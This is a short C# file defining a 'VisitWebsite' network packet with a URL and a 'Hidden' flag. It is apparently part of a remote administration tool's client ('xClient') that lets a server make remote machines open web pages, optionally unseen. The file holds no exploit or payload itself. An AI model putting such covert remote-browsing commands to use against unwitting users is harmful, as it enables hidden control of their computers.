using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class VisitWebsite : IPacket
    {
        public VisitWebsite()
        {
        }

        public VisitWebsite(string url, bool hidden)
        {
            URL = url;
            Hidden = hidden;
        }

        [ProtoMember(1)]
        public string URL { get; set; }

        [ProtoMember(2)]
        public bool Hidden { get; set; }

        public void Execute(Client client)
        {
            client.Send<VisitWebsite>(this);
        }
    }
}